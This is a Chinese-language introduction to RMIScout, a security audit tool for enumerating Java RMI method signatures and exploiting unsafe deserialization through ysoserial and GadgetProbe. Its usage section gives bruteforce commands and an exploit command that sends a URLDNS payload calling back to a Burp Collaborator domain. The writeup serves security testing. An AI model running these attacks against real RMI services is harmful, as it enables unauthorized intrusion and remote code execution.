![RMIScout.png](https://image.3001.net/images/20200613/1592033606_5ee481466c892.png!small)

## RMIScout

RMIScout是一款针对Java RMI的安全审计工具，该工具可以使用字典和爆破策略来枚举Java
RMI功能，并利用其中潜在的RMI参数解集（Unmarshalling）漏洞。实际上，RMIScout能够针对Java
RMI接口执行基于字典的暴力破解攻击，并在不需要调用任何其他方法的情况下安全地猜测方法签名。

在一台存在错误配置的服务器中，任何已知的RMI签名都会使用non-primitive类型，比如说`java.lang.String`，而在这种情况下，攻击者将能够可通过将对象转换为序列化的Payload来利用此漏洞。这种错误配置非常常见，比如说，VMWare
vSphere Data Protection + vRealize Operations Manager、Pivotal tc Server and
Gemfire和Apache Karaf + Cassandra等等。

RMIScout整合[ _ysoserial_](https://github.com/frohoff/ysoserial/)和[
_GadgetProbe_](https://github.com/bishopfox/gadgetprobe)将可以针对错误配置进程范围序列化筛选器（[
_JEP 290_](https://openjdk.java.net/jeps/290)）的服务执行反序列化攻击。

![wordlist_attack.png](https://image.3001.net/images/20200613/1592033624_5ee48158d3c5d.png!small)

## 功能介绍

> 1、提供字典和基于文本的爆破策略，而不是对64位方法哈希进行爆破；
>
> 2、在无需任何方法调用的情况下识别RMI方法；
>
>
> 3、提供了一种简单的方法来利用已知的不安全RMI参数解集漏洞，并与ysoserial或Payload实现`ysoserial.payloads.ObjectPayload`集成；
>
> 4、集成GadgetProbe来识别远程类，以帮助识别相关软件并构建gadget链；
>
> 如需开始搜索，可参考工具自带的`lists/prototypes.txt`字典文件，该字典文件涵盖了超过15000种RMI原型。

## 工作机制

可在无需执行RMI函数的情况下对RMI方法进行识别，RMIScout使用了底层RMI网络功能和动态类生成方法来发送带有故意不匹配类型的RMI调用，以触发远程异常。所有参数都将替换为动态生成的可序列化类，该类的名称假定为255个字符，并且在远程类路径中不存在。比如说：

### 远程接口：

    
    
    void login(String user, String password)

### RMIScout将会调用：

    
    
    login((String) new QQkzkn3..255 chars..(), (String) new QQkzkn3..255 chars..())

如果目标类存在，那么将会触发一个由`ClassNotFoundException`发出的远程`java.rmi.UnmarshalException`异常或参数解集错误，整个过程无需调用底层方法。

完整技术手册：【[ _点我获取_](https://know.bishopfox.com/research/rmiscout)】

## 工具下载

广大研究人员可以使用下列命令将项目源码克隆至本地：

    
    
    git clone https://github.com/BishopFox/rmiscout.git

## 工具使用

针对远程RMI服务，使用函数原型字典执行基于字典的爆破攻击：

    
    
    ./rmiscout.sh wordlist -i lists/prototypes.txt <host> <port>

使用方法字典和其他选项执行爆破攻击：

    
    
    ./rmiscout.sh bruteforce -i lists/methods.txt -r void,boolean,long -p String,int -l 1,4 <host> <port>

根据特定的ysoserial Payload以及Payload参数来转换对象派生类型：

`./rmiscout.sh exploit -s 'void vulnSignature(java.lang.String a, int b)' -p
ysoserial.payloads.URLDNS -c "<http://examplesubdomain.burpcollaborator.net>"
-n registryName <host> <port>`

使用GadgetProbe和已知签名对远程类路径执行爆破：

`./rmiscout.sh probe -s 'void vulnSignature(java.lang.String a, int b)' -i
../GadgetProbe/wordlists/maven_popular.list -d
"examplesubdomain.burpcollaborator.net" -n registryName <host> <port>`

## 构建和运行

使用包含的rmiscout.sh自动化对项目代码进行构建，其封装了`java -jar`语句：

    
    
    ./rmiscout.sh wordlist -i lists/prototypes.txt <host> <port>

或者，你也可以手动构建项目源码，即使用传统的`java -jar`语句：

``

    
    
    # Manually build JAR
    
    ./gradlew shadowJar
    
    java -jar build/libs/rmiscout-1.01-SNAPSHOT-all.jar wordlist -i lists/prototypes.txt <host> <port>

``

``

## 工具使用``

运行RMI演示服务器，并使用`demo/wordlist.txt`字典文件：``

    
    
    cd demo
    
    ./start.sh

``

``

## 项目地址``

RMIScout：【[ _GitHub传送门_](https://github.com/BishopFox/rmiscout)】

**参考来源**

> **[_BishopFox_](https://github.com/BishopFox/rmiscout)**

